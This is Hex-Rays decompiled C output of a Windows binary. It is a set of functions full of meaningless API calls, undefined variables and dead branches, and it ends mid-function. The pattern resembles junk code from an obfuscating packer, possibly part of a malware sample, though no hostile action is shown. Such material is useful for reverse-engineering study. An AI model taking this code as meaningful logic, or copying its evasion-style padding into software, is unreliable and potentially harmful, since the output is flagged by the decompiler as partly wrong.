/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int sub_4012E8();
// char *__usercall sub_401430@<eax>(__int64@<edx:eax>, int@<ecx>, __int64);
// int __usercall sub_401548@<eax>(int@<eax>, int@<edx>, int@<ecx>, __int128);
// int __usercall sub_4017D8@<eax>(__int64@<edx:eax>);
// int __usercall sub_401868@<eax>(int@<eax>, int@<ecx>);
// int __usercall sub_401B20@<eax>(int@<eax>, int@<edx>, int@<ecx>, __int64);
// char *__usercall sub_401D48@<eax>(int@<eax>, int@<edx>, char *@<ecx>);
unsigned int __fastcall sub_402080(int a1, int a2);
// UINT __usercall start@<eax>(int@<ebx>, int@<edi>, int@<esi>, __int64, int);

//-------------------------------------------------------------------------
// Data declarations

// extern HRESULT (__stdcall *CoGetContextToken)(ULONG_PTR *pToken);
// extern BOOL (__stdcall *OpenThreadToken)(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
// extern BOOL (__stdcall *EqualSid)(PSID pSid1, PSID pSid2);
// extern LSTATUS (__stdcall *RegEnumKeyW)(HKEY hKey, DWORD dwIndex, LPWSTR lpName, DWORD cchName);
// extern LSTATUS (__stdcall *RegEnumValueA)(HKEY hKey, DWORD dwIndex, LPSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegOpenKeyW)(HKEY hKey, LPCWSTR lpSubKey, PHKEY phkResult);
// extern BOOL (__stdcall *InitializeAcl)(PACL pAcl, DWORD nAclLength, DWORD dwAclRevision);
// extern BOOL (__stdcall *IsValidSid)(PSID pSid);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName);
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern HANDLE (__stdcall *OpenEventA)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *IsBadReadPtr)(const void *lp, UINT_PTR ucb);
// extern DWORD (__stdcall *GetTickCount)();
// extern HANDLE (__stdcall *OpenMutexW)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern void *(__cdecl *malloc)(size_t Size);
// extern void (__cdecl *_set_app_type)(_crt_app_type Type);
// extern int *(__cdecl *_p__fmode)();
// extern void (__cdecl *_setusermatherr)(_UserMathErrorFunctionPointer UserMathErrorFunction);
// extern int *(__cdecl *_p__commode)();
// extern HDC (__stdcall *GetWindowDC)(HWND hWnd);
// extern int (__stdcall *GetWindowTextA)(HWND hWnd, LPSTR lpString, int nMaxCount);
// extern BOOL (__stdcall *IsChild)(HWND hWndParent, HWND hWnd);
// extern HWND (__stdcall *GetActiveWindow)();
_UNKNOWN unk_406107; // weak
_UNKNOWN unk_40701B; // weak


//----- (004012E8) --------------------------------------------------------
int sub_4012E8()
{
  DWORD FileAttributesW; // eax
  int v1; // eax
  int v3; // [esp+13Ch] [ebp-190h]
  int v4; // [esp+1A4h] [ebp-128h]
  struct HWND__ v5; // [esp+1CCh] [ebp-100h] BYREF
  char pSid[8]; // [esp+1DCh] [ebp-F0h] BYREF
  HKEY v7; // [esp+1E4h] [ebp-E8h] BYREF
  HKEY v8; // [esp+1F4h] [ebp-D8h] BYREF
  struct HKEY__ v9; // [esp+1F8h] [ebp-D4h] BYREF
  __int16 v10[4]; // [esp+200h] [ebp-CCh] BYREF
  DWORD v11[2]; // [esp+208h] [ebp-C4h] BYREF
  _DWORD v12[3]; // [esp+210h] [ebp-BCh] BYREF
  ACL v13; // [esp+238h] [ebp-94h] BYREF
  __int16 SubKey[6]; // [esp+244h] [ebp-88h] BYREF
  __int16 v15[16]; // [esp+250h] [ebp-7Ch] BYREF
  struct HKEY__ hKey; // [esp+270h] [ebp-5Ch] BYREF
  __int16 v17; // [esp+288h] [ebp-44h]
  int savedregs; // [esp+2CCh] [ebp+0h] BYREF

  GetActiveWindow();
  GetTickCount();
  RegOpenKeyW(&v9, (LPCWSTR)SubKey, &v8);
  GetFileAttributesW((LPCWSTR)v12);
  GetWindowDC(&v5);
  RegOpenKeyW(&hKey, (LPCWSTR)v10, &v7);
  GetFileSize(0, v11);
  IsChild((HWND)0x19, (HWND)2);
  InitializeAcl(&v13, 0, 3u);
  GetTickCount();
  IsValidSid(pSid);
  FileAttributesW = GetFileAttributesW((LPCWSTR)v15);
  v1 = v12[1] | v12[0] & FileAttributesW;
  if ( &savedregs == (int *)883 )
  {
    v17 |= 0xF8u;
    v1 = (int)&v11[1] + (v3 | v1 ^ 0x3DBC);
  }
  return (v4 & v1) - 16037;
}
// 40140B: variable 'v3' is possibly undefined
// 40141F: variable 'v4' is possibly undefined
// 4012E8: using guessed type WCHAR SubKey[6];
// 4012E8: using guessed type char pSid[8];
// 4012E8: using guessed type WCHAR anonymous_4[4];
// 4012E8: using guessed type ACL anonymous_5;
// 4012E8: using guessed type WCHAR anonymous_6[16];

//----- (00401430) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
char *__usercall sub_401430@<eax>(__int64 a1@<edx:eax>, int a2@<ecx>, __int64 a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // ecx
  char *v5; // ecx
  __int64 v6; // rax
  char *result; // eax
  char v8; // [esp+64h] [ebp-384h] BYREF
  int v9; // [esp+6Eh] [ebp-37Ah]
  char v10; // [esp+84h] [ebp-364h] BYREF
  int v11; // [esp+88h] [ebp-360h]
  int v12; // [esp+98h] [ebp-350h]
  int v13; // [esp+F8h] [ebp-2F0h]
  int v14; // [esp+1DCh] [ebp-20Ch]
  int v15; // [esp+22Ch] [ebp-1BCh]
  int v16; // [esp+24Ch] [ebp-19Ch]
  int v17; // [esp+2B0h] [ebp-138h]
  __int16 v18; // [esp+2F8h] [ebp-F0h]
  int v19; // [esp+2FCh] [ebp-ECh]
  int v20; // [esp+308h] [ebp-E0h]
  int v21; // [esp+318h] [ebp-D0h]
  int v22; // [esp+388h] [ebp-60h]
  int v23; // [esp+3B8h] [ebp-30h]
  __int16 v24; // [esp+3D0h] [ebp-18h]
  int savedregs; // [esp+3E8h] [ebp+0h] BYREF
  void *retaddr; // [esp+3ECh] [ebp+4h] OVERLAPPED

  if ( !((_DWORD)a1 + a2) )
  {
    LODWORD(a1) = ((unsigned __int16)&savedregs - 568) & 0xDB4;
    HIDWORD(a1) -= a1;
  }
  v3 = (unsigned int)&savedregs;
  if ( HIDWORD(a1) )
  {
    v22 -= 249;
    v3 = a1 & (unsigned int)&savedregs;
    v14 |= a1 & (unsigned int)&savedregs;
    HIDWORD(a1) = a1 + (WORD2(a1) & 0x20AA);
  }
  v4 = v23 & v3;
  HIDWORD(a1) += 9152;
  v24 ^= 0x99u;
  if ( (_DWORD)a1 )
  {
    v24 += 48;
    HIDWORD(a1) = *(_DWORD *)((char *)&a3 + 3) + v20 + HIDWORD(a1) - a3;
    LODWORD(a1) = &savedregs;
    v4 = HIDWORD(a3) & (*(unsigned int *)((char *)&retaddr + 3) ^ (unsigned int)&savedregs);
  }
  v21 &= v4;
  v5 = &v8;
  LODWORD(a1) = v9 + a1;
  if ( !(_DWORD)a1 )
  {
    HIDWORD(v6) = v17 & HIDWORD(a1);
    v5 = (char *)((unsigned int)&savedregs & 0x16EA);
    LODWORD(v6) = -13749;
    v19 |= 0xA1u;
    a1 = v6 - __PAIR64__((unsigned int)&savedregs & 0x16EA, 1014);
  }
  if ( v5 != (char *)250 )
    LODWORD(a1) = a1 - (((_WORD)v13 + (_WORD)v11 + WORD2(a1)) & 0x20B1);
  result = (char *)(a1 + 14850);
  v15 -= (int)result;
  v18 ^= 2u;
  if ( v5 != result )
  {
    v16 -= (int)&savedregs;
    result = &v10;
    v12 &= (unsigned int)&v10;
  }
  return result;
}
// 40152D: returning address of temporary local variable '%var_364'
// 401430: variables would overlap: ^3EC.4(retaddr) and ^3EF.4

//----- (00401548) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
int __usercall sub_401548@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, __int128 a4)
{
  unsigned int v4; // eax
  char *v5; // ecx
  int v6; // edx
  int v7; // ecx
  unsigned int v8; // ecx
  unsigned int v9; // eax
  int v10; // eax
  int v11; // eax
  char *v12; // edx
  char *v13; // ecx
  int v14; // eax
  int v15; // edx
  int v16; // eax
  char *v17; // ecx
  int result; // eax
  _BYTE *v19; // [esp+Ch] [ebp-33Ch]
  int v20; // [esp+26h] [ebp-322h]
  char v21; // [esp+60h] [ebp-2E8h] BYREF
  _BYTE v22[5]; // [esp+65h] [ebp-2E3h]
  int v23; // [esp+6Eh] [ebp-2DAh]
  int v24; // [esp+C4h] [ebp-284h]
  int v25; // [esp+C8h] [ebp-280h]
  char v26; // [esp+E8h] [ebp-260h] BYREF
  _BYTE v27[7]; // [esp+E9h] [ebp-25Fh]
  int v28; // [esp+F8h] [ebp-250h]
  char v29; // [esp+FCh] [ebp-24Ch]
  int v30; // [esp+104h] [ebp-244h]
  int v31; // [esp+10Ch] [ebp-23Ch]
  char v32; // [esp+13Ch] [ebp-20Ch] BYREF
  int v33; // [esp+154h] [ebp-1F4h]
  int v34; // [esp+170h] [ebp-1D8h]
  int v35; // [esp+180h] [ebp-1C8h]
  char v36; // [esp+198h] [ebp-1B0h]
  int v37; // [esp+19Ch] [ebp-1ACh]
  __int16 v38; // [esp+1A8h] [ebp-1A0h]
  int v39; // [esp+1E5h] [ebp-163h]
  int v40; // [esp+1FCh] [ebp-14Ch]
  __int16 v41; // [esp+20Ch] [ebp-13Ch]
  int v42; // [esp+21Ch] [ebp-12Ch]
  int v43; // [esp+278h] [ebp-D0h]
  int v44; // [esp+290h] [ebp-B8h]
  int v45; // [esp+2B4h] [ebp-94h]
  int v46; // [esp+2C8h] [ebp-80h]
  int v47; // [esp+2D4h] [ebp-74h]
  int v48; // [esp+2E0h] [ebp-68h]
  int v49; // [esp+2E4h] [ebp-64h]
  int v50; // [esp+2F8h] [ebp-50h]
  char v51; // [esp+304h] [ebp-44h]
  int v52; // [esp+334h] [ebp-14h]
  char savedregs; // [esp+348h] [ebp+0h] BYREF
  _BYTE savedregs_1[3]; // [esp+349h] [ebp+1h] OVERLAPPED

  v4 = a1 - 9930;
  v30 &= a3 | 0x1C3D;
  v46 &= a2;
  v5 = &savedregs;
  v6 = *(_DWORD *)((_BYTE *)&a4 + 1) & ((*(_DWORD *)((char *)&a4 + 7) | (a2 - 14231)) - DWORD2(a4));
  if ( &savedregs )
  {
    v48 |= *(_DWORD *)((char *)&a4 + 1) | v4;
    v51 ^= 0x1Bu;
    v4 = (unsigned int)&savedregs;
    v6 = ((unsigned int)&savedregs | 0xFB0) - (_DWORD)&savedregs;
    v5 = (char *)(v6 | *(_DWORD *)((char *)&a4 + 1) | *(_DWORD *)savedregs_1 ^ (unsigned int)&savedregs);
  }
  v7 = (int)&v5[v33];
  v31 ^= 0xC4u;
  v45 &= v4;
  if ( v6 != v49 )
  {
    v44 |= v6;
    v40 &= 0xCFu;
    v4 = (unsigned int)&v26;
    v7 = *(_DWORD *)v27 | *(_DWORD *)v27 ^ *(_DWORD *)&savedregs_1[1] & v7;
  }
  v8 = v7 - *(_DWORD *)&savedregs_1[1];
  v9 = v4 | 0x2244;
  if ( &savedregs == (char *)795 )
  {
    v9 = (__PAIR64__(v9, &savedregs) - __PAIR64__(v8, 795)) >> 32;
    v8 |= v9;
  }
  v10 = v9 ^ 0x27B8;
  if ( (char *)v8 == &savedregs )
    v45 &= DWORD2(a4) + (*(_DWORD *)&savedregs_1[2] ^ v10);
  v25 -= (int)&savedregs;
  sub_4012E8();
  *(_WORD *)&v22[3] -= 77;
  v11 = sub_4012E8();
  if ( (char *)v11 == v12 )
  {
    v52 &= (unsigned int)v13;
    v12 = &v21;
    v13 = &v13[*(_DWORD *)v22 - 4815 + v23];
  }
  v24 ^= (unsigned int)v13;
  if ( v13 == v12 )
    LOWORD(v37) = v37 + 87;
  sub_4012E8();
  sub_4012E8();
  LOBYTE(v46) = v46 & 0x13;
  sub_4012E8();
  sub_4012E8();
  sub_4012E8();
  v14 = sub_4012E8();
  if ( v14 != v15 )
  {
    v43 &= 0x6Du;
    v15 ^= 0x1402u;
  }
  if ( v15 == v50 )
  {
    LOBYTE(v34) = v34 & 0x8B;
    v38 |= 0x9Bu;
  }
  if ( (*(_DWORD *)&savedregs_1[1] ^ sub_4012E8()) == 329 )
    v37 ^= 0x5Bu;
  v16 = sub_4012E8();
  if ( v17 == (char *)311 )
  {
    v17 = &v32;
    v42 |= 0xF9u;
    v16 = v28 + v16 - v39;
  }
  v34 |= 0x20u;
  if ( ((unsigned int)v17 & *(_DWORD *)&v27[3]) != 0 )
  {
    v41 += 112;
    v35 &= (unsigned int)v17;
    v16 -= v20;
    v29 &= 0x60u;
  }
  v36 |= 0x4Bu;
  result = *(_DWORD *)((char *)&a4 + 6) ^ v16;
  if ( v19 == &savedregs_1[(_DWORD)a4 - 1] )
    return v47 | result | 0x1D0F;
  return result;
}
// 401548: variables would overlap: ^349.3 and ^349.4,^34A.4,^34B.4

//----- (004017D8) --------------------------------------------------------
int __usercall sub_4017D8@<eax>(__int64 a1@<edx:eax>)
{
  int v1; // eax
  int v2; // ecx
  int v3; // edx
  __int64 v4; // rax
  __int64 v6; // [esp+0h] [ebp-2B0h]
  __int64 v7; // [esp+0h] [ebp-2B0h]
  int savedregs; // [esp+2B0h] [ebp+0h] BYREF

  HIDWORD(a1) |= a1;
  sub_401430(a1, (int)&savedregs, v6);
  v1 = sub_4012E8();
  HIDWORD(v4) = v3 + 1469;
  LODWORD(v4) = v1 ^ 0x2ECF;
  if ( (_DWORD)v4 != 631 )
  {
    LODWORD(v4) = v4 - HIDWORD(v4);
    v2 -= 26366;
  }
  sub_401430(v4, v2, v7);
  sub_4012E8();
  return sub_4012E8();
}
// 4017EC: variable 'v6' is possibly undefined
// 4017F6: variable 'v3' is possibly undefined
// 401828: variable 'v2' is possibly undefined
// 401836: variable 'v7' is possibly undefined

//----- (00401868) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
int __usercall sub_401868@<eax>(int a1@<eax>, int a2@<ecx>)
{
  int v2; // eax
  int v3; // edx
  __int64 v4; // rax
  __int64 v5; // rax
  int v6; // edx
  int v7; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // ecx
  int v11; // ecx
  int v12; // edx
  _BYTE *v13; // edx
  int v14; // ecx
  int *v15; // edx
  __int64 v16; // rax
  __int64 v17; // rax
  int v18; // ecx
  __int64 v19; // rax
  int v20; // ecx
  char *v21; // eax
  int v22; // edx
  char *v23; // edx
  _BYTE *v24; // ecx
  __int64 v25; // rax
  __int64 v26; // rax
  int v27; // ecx
  int v28; // ecx
  int v29; // ecx
  _BYTE *v30; // ecx
  __int64 v31; // rax
  int v32; // eax
  int v33; // edx
  int v34; // edx
  int v35; // ecx
  __int128 v37; // [esp+0h] [ebp-368h]
  __int64 v38; // [esp+0h] [ebp-368h]
  __int64 v39; // [esp+0h] [ebp-368h]
  __int128 v40; // [esp+0h] [ebp-368h]
  __int128 v41; // [esp+0h] [ebp-368h]
  __int64 v42; // [esp+0h] [ebp-368h]
  __int64 v43; // [esp+0h] [ebp-368h]
  __int64 v44; // [esp+0h] [ebp-368h]
  __int64 v45; // [esp+0h] [ebp-368h]
  char v46[3]; // [esp+20h] [ebp-348h] BYREF
  int v47; // [esp+23h] [ebp-345h]
  int v48; // [esp+28h] [ebp-340h]
  _BYTE v49[7]; // [esp+2Ch] [ebp-33Ch] BYREF
  char v50[4]; // [esp+54h] [ebp-314h] BYREF
  int v51; // [esp+58h] [ebp-310h]
  int v52[9]; // [esp+5Eh] [ebp-30Ah]
  __int16 v53; // [esp+84h] [ebp-2E4h]
  char v54; // [esp+88h] [ebp-2E0h]
  int v55; // [esp+94h] [ebp-2D4h]
  int v56; // [esp+B8h] [ebp-2B0h]
  int v57; // [esp+CCh] [ebp-29Ch]
  int v58; // [esp+ECh] [ebp-27Ch]
  int v59[7]; // [esp+F4h] [ebp-274h] BYREF
  char v60; // [esp+110h] [ebp-258h] BYREF
  int v61; // [esp+118h] [ebp-250h]
  int v62; // [esp+11Ch] [ebp-24Ch]
  __int16 v63; // [esp+124h] [ebp-244h]
  char v64; // [esp+13Ch] [ebp-22Ch] BYREF
  unsigned __int16 v65; // [esp+141h] [ebp-227h]
  int v66; // [esp+160h] [ebp-208h]
  __int16 v67; // [esp+164h] [ebp-204h]
  int v68; // [esp+174h] [ebp-1F4h]
  int v69; // [esp+178h] [ebp-1F0h]
  int v70; // [esp+17Ch] [ebp-1ECh]
  int v71; // [esp+1B0h] [ebp-1B8h]
  int v72; // [esp+1C0h] [ebp-1A8h]
  char v73; // [esp+1D0h] [ebp-198h]
  int v74; // [esp+1E4h] [ebp-184h]
  int v75; // [esp+208h] [ebp-160h]
  char v76[4]; // [esp+218h] [ebp-150h] BYREF
  char v77; // [esp+21Ch] [ebp-14Ch]
  _BYTE v78[21]; // [esp+21Fh] [ebp-149h] BYREF
  char v79; // [esp+248h] [ebp-120h] BYREF
  int v80; // [esp+260h] [ebp-108h]
  char v81; // [esp+26Ch] [ebp-FCh]
  int v82; // [esp+278h] [ebp-F0h]
  int v83; // [esp+288h] [ebp-E0h]
  char v84; // [esp+290h] [ebp-D8h]
  int v85; // [esp+2C4h] [ebp-A4h]
  int v86; // [esp+2F0h] [ebp-78h]
  __int16 v87; // [esp+2FCh] [ebp-6Ch]
  int v88; // [esp+360h] [ebp-8h]
  _BYTE savedregs[2]; // [esp+368h] [ebp+0h] BYREF
  __int16 savedregs_2; // [esp+36Ah] [ebp+2h] OVERLAPPED
  void *retaddr; // [esp+36Ch] [ebp+4h] OVERLAPPED

  v48 -= a1;
  v66 -= (int)v50;
  sub_401548(v52[0] & (v51 + (*(int *)((char *)v52 + 3) ^ a1)), (int)v50, a2, v37);
  sub_4012E8();
  v84 |= 0x3Cu;
  v2 = sub_4012E8();
  HIDWORD(v4) = v3 - *(_DWORD *)v78;
  LODWORD(v4) = *(_DWORD *)&v78[8] + v2;
  sub_401430(v4, (int)v76, v38);
  LODWORD(v5) = savedregs;
  HIDWORD(v5) = v6 - (_DWORD)retaddr;
  sub_401430(v5, v7, v39);
  v8 = sub_4012E8();
  v82 -= 250;
  sub_401548(v8, v9, v10, v40);
  v81 -= 6;
  v13 = (_BYTE *)(v12 - v59[4]);
  v14 = v59[0] & (*(int *)((char *)&v59[1] + 3) ^ v11);
  if ( v13 == (_BYTE *)277 )
  {
    v77 &= 0x83u;
    v13 = savedregs;
    v14 = *(_DWORD *)((char *)&savedregs_2 + 1) + v14 - (_DWORD)v59 - *(_DWORD *)((char *)&retaddr + 3);
  }
  v72 &= v14;
  v15 = (int *)((char *)v59 + (_DWORD)v13);
  if ( v59 != v15 )
  {
    v15 = (int *)&v49[4];
    v14 = -9187;
  }
  LODWORD(v16) = v46;
  HIDWORD(v16) = *(_DWORD *)&v49[3] + (v47 & (unsigned int)v15);
  if ( v46 == (char *)v14 )
  {
    HIDWORD(v17) = HIDWORD(v16) - v58;
    v69 -= (int)v46;
    LODWORD(v17) = (unsigned int)v46 & 0x301C;
    v53 |= 0x7Fu;
    v16 = (unsigned int)v14 + v17;
    HIDWORD(v16) += v16;
    v85 |= 0xF9u;
  }
  v83 -= v16;
  v18 = v14 | 0x2B67;
  if ( !HIDWORD(v16) )
  {
    v75 |= v18;
    HIDWORD(v16) = (unsigned int)&v64 & 0x34C1;
    *(_DWORD *)v49 += 230;
    LODWORD(v16) = (v65 ^ (unsigned __int16)v16) & 0x3921;
    v18 = (int)savedregs;
  }
  v74 |= 8u;
  LODWORD(v19) = sub_401548(v16, SHIDWORD(v16), v18, v41);
  v62 &= 0xBAu;
  v21 = sub_401430(v19, v20, v42);
  v23 = (char *)(v58 ^ v22);
  if ( v23 != v21 )
  {
    v56 ^= (unsigned int)v21;
    v21 = &v79;
    v23 = &v60;
  }
  v24 = savedregs;
  LODWORD(v25) = *(_DWORD *)&savedregs_2 | (unsigned int)v21;
  HIDWORD(v25) = &v23[*(_DWORD *)((char *)&retaddr + 1)];
  if ( savedregs == (_BYTE *)134 )
  {
    LODWORD(v25) = v25 + 13118;
    v24 = (_BYTE *)(v88 | 0x86);
  }
  v71 &= v25;
  LODWORD(v26) = sub_401430(v25, (int)(v24 + 6010), v43);
  v28 = v27 - v26;
  v61 -= 138;
  v80 ^= 0x8Au;
  if ( (_DWORD)v26 != 477 )
  {
    v28 += v57;
    v73 &= 0x45u;
  }
  LOWORD(v86) = v86 & 0x58;
  v67 &= 0xC9u;
  v31 = __PAIR64__(&v78[1], (unsigned int)sub_401430(v26, v28, v44));
  v30 = (_BYTE *)(v29 - *(_DWORD *)&v78[17]);
  LODWORD(v31) = (unsigned int)&v78[1] & v31;
  if ( !v30 )
  {
    LODWORD(v31) = 0;
    v30 = savedregs;
  }
  sub_401430(v31, (int)v30, v45);
  v63 &= 0x99u;
  v32 = sub_4012E8();
  v34 = v33 | 0x363B;
  v68 += 30;
  if ( (v35 & v32) != 0 )
  {
    v87 &= 0x2Cu;
    v70 ^= 0x6Au;
    v34 ^= 0x1214u;
  }
  v54 += 13;
  v53 -= 75;
  v55 &= v34;
  v86 -= 189;
  return sub_4012E8();
}
// 401868: variables would overlap: ^36A.2 and ^36A.4,^36B.4
// 401868: variables would overlap: ^36C.4(retaddr) and ^36D.4,^36F.4
// 401868: using guessed type char var_314[4];
// 401868: using guessed type char var_150[4];
// 401868: using guessed type _DWORD var_274[7];
// 401868: using guessed type _DWORD anonymous_2[9];

//----- (00401B20) --------------------------------------------------------
int __usercall sub_401B20@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, __int64 a4)
{
  int v4; // eax
  int v5; // edx
  int v6; // ecx
  char v7; // al
  __int64 v8; // rax
  int v9; // eax
  char v10; // cf
  __int64 v11; // rax
  int v12; // ecx
  __int64 v13; // rax
  int v14; // edx
  int v15; // ecx
  char *v16; // eax
  char *v17; // edx
  __int64 v18; // rax
  int v19; // eax
  int v20; // edx
  int v21; // ecx
  int v22; // eax
  LSTATUS v23; // eax
  int v24; // ecx
  __int16 v25; // dx
  __int64 v26; // rax
  char v27; // dl
  BOOL v28; // eax
  int v29; // ecx
  int v30; // edx
  int v31; // edx
  int v32; // eax
  __int128 v34; // [esp+20h] [ebp-268h]
  __int128 v35; // [esp+20h] [ebp-268h]
  __int128 v36; // [esp+20h] [ebp-268h]
  int v37; // [esp+FCh] [ebp-18Ch]
  int v38[3]; // [esp+128h] [ebp-160h] BYREF
  int v39; // [esp+134h] [ebp-154h]
  char v40; // [esp+14Ch] [ebp-13Ch] BYREF
  int v41; // [esp+158h] [ebp-130h]
  char v42; // [esp+184h] [ebp-104h]
  HKEY v43; // [esp+188h] [ebp-100h] BYREF
  int v44; // [esp+18Ch] [ebp-FCh]
  HANDLE v45; // [esp+190h] [ebp-F8h] BYREF
  DWORD cchValueName; // [esp+1A0h] [ebp-E8h] BYREF
  BYTE Data[12]; // [esp+1A4h] [ebp-E4h] BYREF
  struct HKEY__ hKey; // [esp+1B0h] [ebp-D8h] BYREF
  int v49; // [esp+1B4h] [ebp-D4h] BYREF
  HKEY phkResult; // [esp+1B8h] [ebp-D0h] BYREF
  WCHAR SubKey; // [esp+1D4h] [ebp-B4h] BYREF
  int v52; // [esp+1D8h] [ebp-B0h]
  struct HKEY__ v53; // [esp+1DCh] [ebp-ACh] BYREF
  int v54; // [esp+1E0h] [ebp-A8h]
  __int16 v55[28]; // [esp+1F0h] [ebp-98h] BYREF
  struct HKEY__ v56; // [esp+228h] [ebp-60h] BYREF
  int v57; // [esp+230h] [ebp-58h]
  DWORD v58; // [esp+234h] [ebp-54h] BYREF
  WCHAR v59; // [esp+238h] [ebp-50h] BYREF
  WCHAR Name[2]; // [esp+23Ch] [ebp-4Ch] BYREF
  int v61; // [esp+25Ch] [ebp-2Ch]
  int v62; // [esp+274h] [ebp-14h]
  int v63; // [esp+280h] [ebp-8h]
  int savedregs; // [esp+288h] [ebp+0h] BYREF

  sub_401548(a1, a2, a3 ^ 0x302C, v34);
  v4 = RegOpenKeyW(&hKey, (LPCWSTR)v55, &phkResult);
  v7 = sub_401548(v4, v5, v6, v35);
  LODWORD(v8) = OpenMutexW(v7 & 0x19, 0, Name);
  v9 = sub_4017D8(v8);
  v44 += HIDWORD(v11) + v10 + v9;
  LODWORD(v11) = &savedregs;
  LODWORD(v13) = sub_401430(v11, v12, v36);
  HIDWORD(v13) = v14 - (v10 + (_DWORD)v13);
  v16 = sub_401430(v13, v15, v36);
  if ( v17 != v16 )
    v62 -= ((unsigned int)v17 | 0x279F) + 14478;
  OpenThreadToken(HANDLE_FLAG_PROTECT_FROM_CLOSE|HANDLE_FLAG_INHERIT|0x10, 0, 0, &v45);
  *(_DWORD *)Name |= 0x77u;
  LODWORD(v18) = GetFileAttributesW(&v59);
  v42 -= 26;
  v19 = sub_4017D8(v18);
  v22 = v21 | v19;
  if ( v22 != v21 )
  {
    v61 += 217;
    v52 ^= v20 + (*(_DWORD *)((_BYTE *)&a4 + 3) & v22);
    v63 -= (int)&savedregs;
  }
  v23 = RegEnumValueA(
          &v56,
          (unsigned int)Data & 0x19,
          (LPSTR)3,
          &cchValueName,
          (LPDWORD)&v53,
          &v58,
          Data,
          (LPDWORD)(v20 & 6));
  DWORD2(v36) &= v24;
  HIDWORD(v26) = v25 & 0x3824;
  v39 &= 0x10u;
  v54 ^= v23;
  LODWORD(v26) = v24 + v23;
  sub_401430(v26, v24, v36);
  v28 = IsBadReadPtr(&v49, v27 & 0x12);
  LOWORD(v54) = v54 & 0xFA;
  v31 = v30 - v38[0];
  v32 = v31 + v28;
  if ( !v29 )
  {
    v32 = (int)&v40;
    v31 = v41 & (unsigned int)v38;
    v29 = ((*(int *)((char *)&v38[1] + 1) - 15248) ^ 0x1B1D) + 4054;
  }
  if ( v32 != v31 )
  {
    v29 = v32 | ((v37 ^ v29) - 8808);
    v32 *= 2;
    v57 += 9;
  }
  sub_401548(v32, v31, v29, v36);
  RegOpenKeyW(&v53, &SubKey, &v43);
  return sub_4012E8();
}
// 401B2F: variable 'v34' is possibly undefined
// 401B64: variable 'v5' is possibly undefined
// 401B64: variable 'v6' is possibly undefined
// 401B64: variable 'v35' is possibly undefined
// 401B81: variable 'v8' is possibly undefined
// 401B86: variable 'v11' is possibly undefined
// 401B86: variable 'v10' is possibly undefined
// 401B90: variable 'v12' is possibly undefined
// 401B90: variable 'v36' is possibly undefined
// 401B95: variable 'v14' is possibly undefined
// 401B97: variable 'v15' is possibly undefined
// 401B9E: variable 'v17' is possibly undefined
// 401C0D: variable 'v18' is possibly undefined
// 401C12: variable 'v21' is possibly undefined
// 401C24: variable 'v20' is possibly undefined
// 401C63: variable 'v24' is possibly undefined
// 401C69: variable 'v25' is possibly undefined
// 401C8D: variable 'v27' is possibly undefined
// 401CA5: variable 'v30' is possibly undefined
// 401CAF: variable 'v29' is possibly undefined
// 401CE4: variable 'v37' is possibly undefined
// 401B20: using guessed type WCHAR anonymous_4[28];

//----- (00401D48) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
char *__usercall sub_401D48@<eax>(int a1@<eax>, int a2@<edx>, char *a3@<ecx>)
{
  int v3; // eax
  int v4; // edx
  int v5; // ecx
  unsigned int v6; // eax
  int v7; // eax
  int *v8; // edx
  bool v9; // cf
  __int128 v11; // [esp+0h] [ebp-2A0h]
  int v12; // [esp+64h] [ebp-23Ch]
  char v13; // [esp+8Ch] [ebp-214h] BYREF
  _DWORD v14[36]; // [esp+91h] [ebp-20Fh]
  int v15; // [esp+124h] [ebp-17Ch]
  int v16; // [esp+130h] [ebp-170h]
  int v17; // [esp+145h] [ebp-15Bh]
  int v18[12]; // [esp+14Dh] [ebp-153h]
  int v19; // [esp+180h] [ebp-120h]
  char v20; // [esp+184h] [ebp-11Ch]
  int v21; // [esp+18Ch] [ebp-114h]
  __int16 v22; // [esp+22Ch] [ebp-74h]
  int v23; // [esp+234h] [ebp-6Ch]
  char v24; // [esp+268h] [ebp-38h]
  int savedregs; // [esp+2A0h] [ebp+0h] BYREF
  void *retaddr; // [esp+2A4h] [ebp+4h] OVERLAPPED

  if ( a2 == v21 )
  {
    a1 -= *(int *)((char *)v18 + 2);
    a3 = &v13;
    a2 = (*(_DWORD *)((char *)&v14[2] + 3) ^ v14[0] & (*(_DWORD *)((char *)v14 + 3) | v17 | v18[0] | a2)) + 14489;
  }
  v3 = sub_401548(a1, a2, (int)a3, v11);
  v19 += 22;
  v20 += 29;
  if ( v4 != v3 )
  {
    v5 = (v5 & 0xE1F) - v3 - v3;
    v24 += 45;
    v3 |= 0x31DDu;
  }
  v22 -= 33;
  v6 = v3 + 14860 - v12 - 3460;
  if ( !v5 )
  {
    v7 = v23 + v6;
    v4 -= v7;
    v16 ^= v4;
    v5 = v4;
    v6 = v7 + 406;
  }
  v15 &= v5;
